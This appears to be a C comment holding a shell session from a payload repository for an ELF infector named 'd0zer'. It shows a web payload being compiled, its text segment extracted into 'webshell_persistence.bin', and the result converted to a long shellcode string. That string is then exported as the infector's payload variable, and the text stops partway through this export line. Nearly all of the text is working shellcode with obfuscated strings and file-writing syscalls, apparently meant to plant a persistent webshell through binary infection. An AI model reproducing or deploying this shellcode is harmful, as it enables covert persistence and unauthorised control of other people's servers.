/*[sad0p@arch-deliberate d0zer-payloads]$ #compile the d0zer-webv1.c
[sad0p@arch-deliberate d0zer-payloads]$ gcc d0zer-webv1.c -o d0zer-webv1 -fno-stack-protector -nostdlib -fPIC -O0
[sad0p@arch-deliberate d0zer-payloads]$ #extract the contents of the text segment that contains our position independent code
[sad0p@arch-deliberate d0zer-payloads]$ readelf -l ./d0zer-webv1

Elf file type is DYN (Position-Independent Executable file)
Entry point 0x1000
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000002d8 0x00000000000002d8  R      0x8
  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000003c9 0x00000000000003c9  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000008f2 0x00000000000008f2  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000374 0x0000000000000374  R      0x1000
  LOAD           0x0000000000002f30 0x0000000000003f30 0x0000000000003f30
                 0x00000000000000d0 0x00000000000000d0  RW     0x1000
  DYNAMIC        0x0000000000002f30 0x0000000000003f30 0x0000000000003f30
                 0x00000000000000d0 0x00000000000000d0  RW     0x8
  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
                 0x0000000000000024 0x0000000000000024  R      0x4
  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  GNU_EH_FRAME   0x0000000000002018 0x0000000000002018 0x0000000000002018
                 0x00000000000000b4 0x00000000000000b4  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002f30 0x0000000000003f30 0x0000000000003f30
                 0x00000000000000d0 0x00000000000000d0  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.gnu.property .note.gnu.build-id .gnu.hash .dynsym .dynstr
   03     .text
   04     .rodata .eh_frame_hdr .eh_frame
   05     .dynamic
   06     .dynamic
   07     .note.gnu.property
   08     .note.gnu.build-id
   09     .note.gnu.property
   10     .eh_frame_hdr
   11
   12     .dynamic
[sad0p@arch-deliberate d0zer-payloads]$ dd if=./d0zer-webv1 of=./webshell_persistence.bin bs=1 count=$((0x8f2)) skip=$((0x1000))
2290+0 records in
2290+0 records out
2290 bytes (2.3 kB, 2.2 KiB) copied, 0.0205978 s, 111 kB/s
[sad0p@arch-deliberate d0zer-payloads]$ #convert the binary to shellcode with shellcode.py
[sad0p@arch-deliberate d0zer-payloads]$ #the script can be found in this repo
[sad0p@arch-deliberate d0zer-payloads]$ #the second argument to the script just ommits the last 3 bytes which are junk bytes
[sad0p@arch-deliberate d0zer-payloads]$ ./shellcode.py ./webshell_persistence.bin 3
"\xb8\x00\x00\x00\x00\xe8\x08\x00\x00\x00\xe9\xe0\x08\x00\x00\x90\x0f\x0b\x55\x48\x89\xe5\x48\x81\xec\xc0\x00\x00\x00\xc7\x45\xf4\xff\xff\xff\xff\x48\xc7\x45\xf8\x00\x00\x00\x00\x48\xc7\x45\xe8\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xe8\x97\x08\x00\x00\x48\x85\xc0\x0f\x85\x5f\x01\x00\x00\xb8\x00\x00\x00\x00\xe8\x24\x06\x00\x00\x48\x89\x45\xe8\x48\x83\x7d\xe8\x00\x0f\x84\x49\x01\x00\x00\x48\x8b\x45\xe8\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\x89\xc7\xe8\xb2\x06\x00\x00\x89\x45\xf4\x83\x7d\xf4\x00\x0f\x88\xcc\x00\x00\x00\x48\x8d\x95\x40\xff\xff\xff\x48\x8b\x45\xe8\x48\x89\xd6\x48\x89\xc7\xe8\xb4\x07\x00\x00\x48\x85\xc0\x0f\x88\xb0\x00\x00\x00\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc7\xe8\xc1\x04\x00\x00\x48\x89\x45\xf8\x48\x83\x7d\xf8\x00\x0f\x84\x95\x00\x00\x00\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc2\x48\x8b\x4d\xf8\x8b\x45\xf4\x48\x89\xce\x89\xc7\xe8\xae\x06\x00\x00\x48\x89\xc2\x48\x8b\x85\x70\xff\xff\xff\x48\x39\xc2\x75\x6e\x48\x8b\x45\xf8\x48\x89\x45\xe0\x48\x8b\x45\xe0\x48\x8b\x48\x28\x48\x8b\x45\xe0\x0f\xb7\x40\x3c\x0f\xb7\xd0\x48\x8b\x45\xe0\x0f\xb7\x40\x3a\x0f\xb7\xc0\x0f\xaf\xc2\x48\x98\x48\x01\xc8\x48\x89\x45\xd8\x48\x8b\x95\x70\xff\xff\xff\x48\x8b\x45\xd8\x48\x39\xc2\x74\x2f\x48\x8b\x85\x70\xff\xff\xff\x48\x2b\x45\xd8\x48\x89\xc2\x48\x8b\x4d\xd8\x48\x8b\x45\xf8\x48\x89\xce\x48\x89\xc7\xe8\xb3\x00\x00\x00\xeb\x0d\x90\xeb\x0a\x90\xeb\x07\x90\xeb\x04\x90\xeb\x01\x90\x83\x7d\xf4\x00\x7e\x0a\x8b\x45\xf4\x89\xc7\xe8\x4e\x06\x00\x00\x48\x83\x7d\xe8\x00\x74\x11\x48\x8b\x45\xe8\xbe\x00\x10\x00\x00\x48\x89\xc7\xe8\x9f\x06\x00\x00\x48\x83\x7d\xf8\x00\x74\x1f\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc2\x48\x8b\x45\xf8\x48\x89\xd6\x48\x89\xc7\xe8\x7f\x06\x00\x00\xeb\x04\x90\xeb\x01\x90\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\xc6\x45\xf7\x01\x48\x8b\x45\xe0\x48\x89\x45\xf8\xeb\x25\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x30\x0f\xb6\x4d\xf7\x48\x8b\x45\xf8\x48\x8d\x50\x01\x48\x89\x55\xf8\x31\xce\x89\xf2\x88\x10\x48\x8b\x45\xe8\x0f\xb6\x00\x84\xc0\x75\xd0\x48\x8b\x45\xf8\xc6\x00\x00\x90\x5d\xc3\x55\x48\x89\xe5\x53\x48\x81\xec\x88\x00\x00\x00\x48\x89\x7d\x88\x48\x89\x75\x80\x48\x89\x95\x78\xff\xff\xff\x48\x89\xe0\x48\x89\xc3\xc7\x45\xec\xff\xff\xff\xff\x48\xc7\x45\xe0\x00\x00\x00\x00\x48\xc7\x45\xd0\x00\x00\x00\x00\x48\x8d\x05\xc1\x0d\x00\x00\x48\x89\xc7\xe8\xfb\x02\x00\x00\x48\x83\xc0\x01\x48\x89\xc2\x48\x83\xea\x01\x48\x89\x55\xc8\xba\x10\x00\x00\x00\x48\x83\xea\x01\x48\x01\xd0\xb9\x10\x00\x00\x00\xba\x00\x00\x00\x00\x48\xf7\xf1\x48\x6b\xc0\x10\x48\x29\xc4\x48\x89\xe0\x48\x83\xc0\x00\x48\x89\x45\xc0\x48\x8d\x05\x86\x0d\x00\x00\x48\x89\xc7\xe8\xb2\x02\x00\x00\x48\x83\xc0\x01\x48\x89\xc2\x48\x83\xea\x01\x48\x89\x55\xb8\xba\x10\x00\x00\x00\x48\x83\xea\x01\x48\x01\xd0\xb9\x10\x00\x00\x00\xba\x00\x00\x00\x00\x48\xf7\xf1\x48\x6b\xc0\x10\x48\x29\xc4\x48\x89\xe0\x48\x83\xc0\x00\x48\x89\x45\xb0\x48\xb8\x2e\x77\x60\x73\x2e\x76\x76\x76\x48\x89\x45\xa2\x48\xb8\x76\x76\x2e\x69\x75\x6c\x6d\x00\x48\x89\x45\xa8\x48\xb8\x64\x6f\x2c\x74\x72\x2f\x71\x69\x48\x89\x45\x98\x66\xc7\x45\xa0\x71\x00\x48\x8b\x55\xc0\x48\x8d\x45\xa2\x48\x89\xd6\x48\x89\xc7\xe8\x9f\xfe\xff\xff\x48\x8b\x55\xb0\x48\x8d\x45\x98\x48\x89\xd6\x48\x89\xc7\xe8\x8c\xfe\xff\xff\x48\x8b\x55\xb0\x48\x8b\x45\xc0\x48\x89\xd6\x48\x89\xc7\xe8\x45\x01\x00\x00\x48\x89\x45\xd0\x48\x83\x7d\xd0\x00\x0f\x84\xd0\x00\x00\x00\x48\x8b\x45\xd0\xbe\x00\x00\x00\x00\x48\x89\xc7\xe8\x56\x05\x00\x00\x48\x85\xc0\x0f\x84\xb9\x00\x00\x00\x48\x8b\x85\x78\xff\xff\xff\x48\x89\xc7\xe8\x07\x02\x00\x00\x48\x89\x45\xe0\x48\x83\x7d\xe0\x00\x0f\x84\x9e\x00\x00\x00\x48\x8b\x55\x88\x48\x8b\x45\x80\x48\x8d\x0c\x02\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x45\xe0\x48\x89\xce\x48\x89\xc7\xe8\x13\x02\x00\x00\xc7\x45\xdc\x00\x00\x00\x00\xeb\x26\x8b\x45\xdc\x48\x63\xd0\x48\x8b\x45\xe0\x48\x01\xd0\x0f\xb6\x10\x8b\x45\xdc\x48\x63\xc8\x48\x8b\x45\xe0\x48\x01\xc8\x83\xf2\x01\x88\x10\x83\x45\xdc\x01\x8b\x45\xdc\x48\x98\x48\x3b\x85\x78\xff\xff\xff\x72\xcc\x48\x8b\x45\xd0\xba\xed\x01\x00\x00\xbe\x41\x00\x00\x00\x48\x89\xc7\xe8\x39\x03\x00\x00\x89\x45\xec\x83\x7d\xec\x00\x78\x23\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x4d\xe0\x8b\x45\xec\x48\x89\xce\x89\xc7\xe8\x48\x03\x00\x00\xeb\x0a\x90\xeb\x07\x90\xeb\x04\x90\xeb\x01\x90\x83\x7d\xec\x00\x7e\x0a\x8b\x45\xec\x89\xc7\xe8\x8e\x03\x00\x00\x48\x83\x7d\xd0\x00\x74\x1e\x48\x8b\x45\xd0\x48\x89\xc7\xe8\x03\x01\x00\x00\x48\x89\xc2\x48\x8b\x45\xd0\x48\x89\xd6\x48\x89\xc7\xe8\xd2\x03\x00\x00\x48\x83\x7d\xe0\x00\x74\x16\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x45\xe0\x48\x89\xd6\x48\x89\xc7\xe8\xb5\x03\x00\x00\x48\x89\xdc\x90\x48\x8b\x5d\xf8\xc9\xc3\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x7d\xd8\x48\x89\x75\xd0\x48\x8b\x45\xd0\x48\x89\xc7\xe8\xae\x00\x00\x00\x48\x89\x45\xf8\x48\x8b\x45\xd8\x48\x89\xc7\xe8\x9e\x00\x00\x00\x48\x89\x45\xf0\x48\x8b\x45\xd8\x48\x89\xc7\xe8\x8e\x00\x00\x00\x48\x8b\x55\xf8\x48\x01\xd0\x48\x89\x45\xe8\x48\x83\x45\xe8\x02\x48\x8b\x45\xe8\x48\x89\xc7\xe8\xa2\x00\x00\x00\x48\x89\x45\xe0\x48\x83\x7d\xe0\x00\x75\x07\xb8\x00\x00\x00\x00\xeb\x5e\x48\x8b\x55\xe8\x48\x8b\x4d\xd8\x48\x8b\x45\xe0\x48\x89\xce\x48\x89\xc7\xe8\xb6\x00\x00\x00\x48\x8b\x45\xf0\x48\x8d\x50\x01\x48\x89\x55\xf0\x48\x8b\x55\xe0\x48\x01\xd0\xc6\x00\x2f\x48\x8b\x55\xe0\x48\x8b\x45\xf0\x48\x8d\x0c\x02\x48\x8b\x55\xf8\x48\x8b\x45\xd0\x48\x89\xc6\x48\x89\xcf\xe8\x81\x00\x00\x00\x48\x8b\x55\xe0\x48\x8b\x45\xe8\x48\x01\xd0\xc6\x00\x00\x48\x8b\x45\xe0\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\xc7\x45\xf8\x00\x00\x00\x00\xeb\x05\x48\x83\x45\xf8\x01\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x84\xc0\x75\xe8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x89\x7d\xe8\x48\x8b\x45\xe8\x41\xb9\x00\x00\x00\x00\x41\xb8\xff\xff\xff\xff\xb9\x21\x00\x00\x00\xba\x03\x00\x00\x00\x48\x89\xc6\xbf\x00\x00\x00\x00\xe8\x36\x02\x00\x00\x48\x89\x45\xf8\x48\x8b\x45\xf8\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\x89\x55\xe8\xeb\x1d\x48\x8b\x55\xf0\x48\x8d\x42\x01\x48\x89\x45\xf0\x48\x8b\x45\xf8\x48\x8d\x48\x01\x48\x89\x4d\xf8\x0f\xb6\x12\x88\x10\x48\x8b\x45\xe8\x48\x8d\x50\xff\x48\x89\x55\xe8\x48\x85\xc0\x74\x0b\x48\x8b\x45\xf0\x0f\xb6\x00\x84\xc0\x75\xc7\x48\x8b\x45\xf8\xc6\x00\x00\x90\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\x89\x55\xd8\xc7\x45\xfc\x00\x00\x00\x00\x48\xc7\x45\xf0\x00\x00\x00\x00\xeb\x41\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x0f\xb6\xc8\x48\x8b\x45\xe0\x48\x8d\x50\x01\x48\x89\x55\xe0\x0f\xb6\x00\x0f\xb6\xc0\x29\xc1\x89\xca\x89\x55\xfc\x83\x7d\xfc\x00\x75\x1a\x48\x8b\x45\xe8\x0f\xb6\x00\x84\xc0\x74\x0f\x48\x83\x45\xf0\x01\x48\x8b\x45\xf0\x48\x3b\x45\xd8\x72\xb5\x8b\x45\xfc\x5d\xc3\x55\x48\x89\xe5\x48\x83\xec\x30\x48\xb8\x2e\x71\x73\x6e\x62\x2e\x72\x64\x48\x89\x45\xd1\x48\xb8\x64\x6d\x67\x2e\x64\x79\x64\x00\x48\x89\x45\xd8\x48\x8d\x45\xd1\x48\x89\xc7\xe8\x9d\xfe\xff\xff\x48\x83\xc0\x01\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\x89\xc7\xe8\xb9\xfe\xff\xff\x48\x89\x45\xf0\xbf\x00\x10\x00\x00\xe8\xab\xfe\xff\xff\x48\x89\x45\xe8\x48\x83\x7d\xe8\x00\x74\x3d\x48\x8b\x55\xf0\x48\x8d\x45\xd1\x48\x89\xd6\x48\x89\xc7\xe8\xc7\xfa\xff\xff\x48\x8b\x4d\xe8\x48\x8b\x45\xf0\xba\x00\x10\x00\x00\x48\x89\xce\x48\x89\xc7\xe8\x7a\x01\x00\x00\x48\x89\x45\xe0\x48\x8b\x55\xe8\x48\x8b\x45\xe0\x48\x01\xd0\xc6\x00\x00\x48\x8b\x55\xf8\x48\x8b\x45\xf0\x48\x89\xd6\x48\x89\xc7\xe8\x01\x01\x00\x00\x48\x8b\x45\xe8\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x89\x75\xe4\x89\x55\xe0\x48\xc7\xc0\x02\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe4\x48\x8b\x55\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x01\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x00\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\xc7\xc0\x03\x00\x00\x00\x48\x8b\x7d\xec\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x89\x55\xdc\x89\x4d\xd8\x44\x89\x45\xd4\x4c\x89\x4d\xc8\x48\xc7\xc0\x09\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x48\x8b\x55\xdc\x4c\x8b\x55\xd8\x4c\x8b\x45\xd4\x4c\x8b\x4d\xc8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\xc7\xc0\x0b\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\xc7\xc0\x04\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x59\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x89\x75\xe4\x48\xc7\xc0\x15\x00\x00\x00\x48\x8b\x7d\xe8\x48\xc7\xc6\x01\x00\x00\x00\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\xc7\xc0\x6b\x00\x00\x00\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3"
[sad0p@arch-deliberate d0zer-payloads]$ #then export to the environmental variable DOZEREGG
[sad0p@arch-deliberate d0zer-payloads]$ export DOZEREGG="\xb8\x00\x00\x00\x00\xe8\x08\x00\x00\x00\xe9\xe0\x08\x00\x00\x90\x0f\x0b\x55\x48\x89\xe5\x48\x81\xec\xc0\x00\x00\x00\xc7\x45\xf4\xff\xff\xff\xff\x48\xc7\x45\xf8\x00\x00\x00\x00\x48\xc7\x45\xe8\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xe8\x97\x08\x00\x00\x48\x85\xc0\x0f\x85\x5f\x01\x00\x00\xb8\x00\x00\x00\x00\xe8\x24\x06\x00\x00\x48\x89\x45\xe8\x48\x83\x7d\xe8\x00\x0f\x84\x49\x01\x00\x00\x48\x8b\x45\xe8\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\x89\xc7\xe8\xb2\x06\x00\x00\x89\x45\xf4\x83\x7d\xf4\x00\x0f\x88\xcc\x00\x00\x00\x48\x8d\x95\x40\xff\xff\xff\x48\x8b\x45\xe8\x48\x89\xd6\x48\x89\xc7\xe8\xb4\x07\x00\x00\x48\x85\xc0\x0f\x88\xb0\x00\x00\x00\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc7\xe8\xc1\x04\x00\x00\x48\x89\x45\xf8\x48\x83\x7d\xf8\x00\x0f\x84\x95\x00\x00\x00\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc2\x48\x8b\x4d\xf8\x8b\x45\xf4\x48\x89\xce\x89\xc7\xe8\xae\x06\x00\x00\x48\x89\xc2\x48\x8b\x85\x70\xff\xff\xff\x48\x39\xc2\x75\x6e\x48\x8b\x45\xf8\x48\x89\x45\xe0\x48\x8b\x45\xe0\x48\x8b\x48\x28\x48\x8b\x45\xe0\x0f\xb7\x40\x3c\x0f\xb7\xd0\x48\x8b\x45\xe0\x0f\xb7\x40\x3a\x0f\xb7\xc0\x0f\xaf\xc2\x48\x98\x48\x01\xc8\x48\x89\x45\xd8\x48\x8b\x95\x70\xff\xff\xff\x48\x8b\x45\xd8\x48\x39\xc2\x74\x2f\x48\x8b\x85\x70\xff\xff\xff\x48\x2b\x45\xd8\x48\x89\xc2\x48\x8b\x4d\xd8\x48\x8b\x45\xf8\x48\x89\xce\x48\x89\xc7\xe8\xb3\x00\x00\x00\xeb\x0d\x90\xeb\x0a\x90\xeb\x07\x90\xeb\x04\x90\xeb\x01\x90\x83\x7d\xf4\x00\x7e\x0a\x8b\x45\xf4\x89\xc7\xe8\x4e\x06\x00\x00\x48\x83\x7d\xe8\x00\x74\x11\x48\x8b\x45\xe8\xbe\x00\x10\x00\x00\x48\x89\xc7\xe8\x9f\x06\x00\x00\x48\x83\x7d\xf8\x00\x74\x1f\x48\x8b\x85\x70\xff\xff\xff\x48\x89\xc2\x48\x8b\x45\xf8\x48\x89\xd6\x48\x89\xc7\xe8\x7f\x06\x00\x00\xeb\x04\x90\xeb\x01\x90\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\xc6\x45\xf7\x01\x48\x8b\x45\xe0\x48\x89\x45\xf8\xeb\x25\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x30\x0f\xb6\x4d\xf7\x48\x8b\x45\xf8\x48\x8d\x50\x01\x48\x89\x55\xf8\x31\xce\x89\xf2\x88\x10\x48\x8b\x45\xe8\x0f\xb6\x00\x84\xc0\x75\xd0\x48\x8b\x45\xf8\xc6\x00\x00\x90\x5d\xc3\x55\x48\x89\xe5\x53\x48\x81\xec\x88\x00\x00\x00\x48\x89\x7d\x88\x48\x89\x75\x80\x48\x89\x95\x78\xff\xff\xff\x48\x89\xe0\x48\x89\xc3\xc7\x45\xec\xff\xff\xff\xff\x48\xc7\x45\xe0\x00\x00\x00\x00\x48\xc7\x45\xd0\x00\x00\x00\x00\x48\x8d\x05\xc1\x0d\x00\x00\x48\x89\xc7\xe8\xfb\x02\x00\x00\x48\x83\xc0\x01\x48\x89\xc2\x48\x83\xea\x01\x48\x89\x55\xc8\xba\x10\x00\x00\x00\x48\x83\xea\x01\x48\x01\xd0\xb9\x10\x00\x00\x00\xba\x00\x00\x00\x00\x48\xf7\xf1\x48\x6b\xc0\x10\x48\x29\xc4\x48\x89\xe0\x48\x83\xc0\x00\x48\x89\x45\xc0\x48\x8d\x05\x86\x0d\x00\x00\x48\x89\xc7\xe8\xb2\x02\x00\x00\x48\x83\xc0\x01\x48\x89\xc2\x48\x83\xea\x01\x48\x89\x55\xb8\xba\x10\x00\x00\x00\x48\x83\xea\x01\x48\x01\xd0\xb9\x10\x00\x00\x00\xba\x00\x00\x00\x00\x48\xf7\xf1\x48\x6b\xc0\x10\x48\x29\xc4\x48\x89\xe0\x48\x83\xc0\x00\x48\x89\x45\xb0\x48\xb8\x2e\x77\x60\x73\x2e\x76\x76\x76\x48\x89\x45\xa2\x48\xb8\x76\x76\x2e\x69\x75\x6c\x6d\x00\x48\x89\x45\xa8\x48\xb8\x64\x6f\x2c\x74\x72\x2f\x71\x69\x48\x89\x45\x98\x66\xc7\x45\xa0\x71\x00\x48\x8b\x55\xc0\x48\x8d\x45\xa2\x48\x89\xd6\x48\x89\xc7\xe8\x9f\xfe\xff\xff\x48\x8b\x55\xb0\x48\x8d\x45\x98\x48\x89\xd6\x48\x89\xc7\xe8\x8c\xfe\xff\xff\x48\x8b\x55\xb0\x48\x8b\x45\xc0\x48\x89\xd6\x48\x89\xc7\xe8\x45\x01\x00\x00\x48\x89\x45\xd0\x48\x83\x7d\xd0\x00\x0f\x84\xd0\x00\x00\x00\x48\x8b\x45\xd0\xbe\x00\x00\x00\x00\x48\x89\xc7\xe8\x56\x05\x00\x00\x48\x85\xc0\x0f\x84\xb9\x00\x00\x00\x48\x8b\x85\x78\xff\xff\xff\x48\x89\xc7\xe8\x07\x02\x00\x00\x48\x89\x45\xe0\x48\x83\x7d\xe0\x00\x0f\x84\x9e\x00\x00\x00\x48\x8b\x55\x88\x48\x8b\x45\x80\x48\x8d\x0c\x02\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x45\xe0\x48\x89\xce\x48\x89\xc7\xe8\x13\x02\x00\x00\xc7\x45\xdc\x00\x00\x00\x00\xeb\x26\x8b\x45\xdc\x48\x63\xd0\x48\x8b\x45\xe0\x48\x01\xd0\x0f\xb6\x10\x8b\x45\xdc\x48\x63\xc8\x48\x8b\x45\xe0\x48\x01\xc8\x83\xf2\x01\x88\x10\x83\x45\xdc\x01\x8b\x45\xdc\x48\x98\x48\x3b\x85\x78\xff\xff\xff\x72\xcc\x48\x8b\x45\xd0\xba\xed\x01\x00\x00\xbe\x41\x00\x00\x00\x48\x89\xc7\xe8\x39\x03\x00\x00\x89\x45\xec\x83\x7d\xec\x00\x78\x23\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x4d\xe0\x8b\x45\xec\x48\x89\xce\x89\xc7\xe8\x48\x03\x00\x00\xeb\x0a\x90\xeb\x07\x90\xeb\x04\x90\xeb\x01\x90\x83\x7d\xec\x00\x7e\x0a\x8b\x45\xec\x89\xc7\xe8\x8e\x03\x00\x00\x48\x83\x7d\xd0\x00\x74\x1e\x48\x8b\x45\xd0\x48\x89\xc7\xe8\x03\x01\x00\x00\x48\x89\xc2\x48\x8b\x45\xd0\x48\x89\xd6\x48\x89\xc7\xe8\xd2\x03\x00\x00\x48\x83\x7d\xe0\x00\x74\x16\x48\x8b\x95\x78\xff\xff\xff\x48\x8b\x45\xe0\x48\x89\xd6\x48\x89\xc7\xe8\xb5\x03\x00\x00\x48\x89\xdc\x90\x48\x8b\x5d\xf8\xc9\xc3\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x7d\xd8\x48\x89\x75\xd0\x48\x8b\x45\xd0\x48\x89\xc7\xe8\xae\x00\x00\x00\x48\x89\x45\xf8\x48\x8b\x45\xd8\x48\x89\xc7\xe8\x9e\x00\x00\x00\x48\x89\x45\xf0\x48\x8b\x45\xd8\x48\x89\xc7\xe8\x8e\x00\x00\x00\x48\x8b\x55\xf8\x48\x01\xd0\x48\x89\x45\xe8\x48\x83\x45\xe8\x02\x48\x8b\x45\xe8\x48\x89\xc7\xe8\xa2\x00\x00\x00\x48\x89\x45\xe0\x48\x83\x7d\xe0\x00\x75\x07\xb8\x00\x00\x00\x00\xeb\x5e\x48\x8b\x55\xe8\x48\x8b\x4d\xd8\x48\x8b\x45\xe0\x48\x89\xce\x48\x89\xc7\xe8\xb6\x00\x00\x00\x48\x8b\x45\xf0\x48\x8d\x50\x01\x48\x89\x55\xf0\x48\x8b\x55\xe0\x48\x01\xd0\xc6\x00\x2f\x48\x8b\x55\xe0\x48\x8b\x45\xf0\x48\x8d\x0c\x02\x48\x8b\x55\xf8\x48\x8b\x45\xd0\x48\x89\xc6\x48\x89\xcf\xe8\x81\x00\x00\x00\x48\x8b\x55\xe0\x48\x8b\x45\xe8\x48\x01\xd0\xc6\x00\x00\x48\x8b\x45\xe0\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\xc7\x45\xf8\x00\x00\x00\x00\xeb\x05\x48\x83\x45\xf8\x01\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x84\xc0\x75\xe8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x89\x7d\xe8\x48\x8b\x45\xe8\x41\xb9\x00\x00\x00\x00\x41\xb8\xff\xff\xff\xff\xb9\x21\x00\x00\x00\xba\x03\x00\x00\x00\x48\x89\xc6\xbf\x00\x00\x00\x00\xe8\x36\x02\x00\x00\x48\x89\x45\xf8\x48\x8b\x45\xf8\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\x89\x55\xe8\xeb\x1d\x48\x8b\x55\xf0\x48\x8d\x42\x01\x48\x89\x45\xf0\x48\x8b\x45\xf8\x48\x8d\x48\x01\x48\x89\x4d\xf8\x0f\xb6\x12\x88\x10\x48\x8b\x45\xe8\x48\x8d\x50\xff\x48\x89\x55\xe8\x48\x85\xc0\x74\x0b\x48\x8b\x45\xf0\x0f\xb6\x00\x84\xc0\x75\xc7\x48\x8b\x45\xf8\xc6\x00\x00\x90\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\x89\x55\xd8\xc7\x45\xfc\x00\x00\x00\x00\x48\xc7\x45\xf0\x00\x00\x00\x00\xeb\x41\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x0f\xb6\xc8\x48\x8b\x45\xe0\x48\x8d\x50\x01\x48\x89\x55\xe0\x0f\xb6\x00\x0f\xb6\xc0\x29\xc1\x89\xca\x89\x55\xfc\x83\x7d\xfc\x00\x75\x1a\x48\x8b\x45\xe8\x0f\xb6\x00\x84\xc0\x74\x0f\x48\x83\x45\xf0\x01\x48\x8b\x45\xf0\x48\x3b\x45\xd8\x72\xb5\x8b\x45\xfc\x5d\xc3\x55\x48\x89\xe5\x48\x83\xec\x30\x48\xb8\x2e\x71\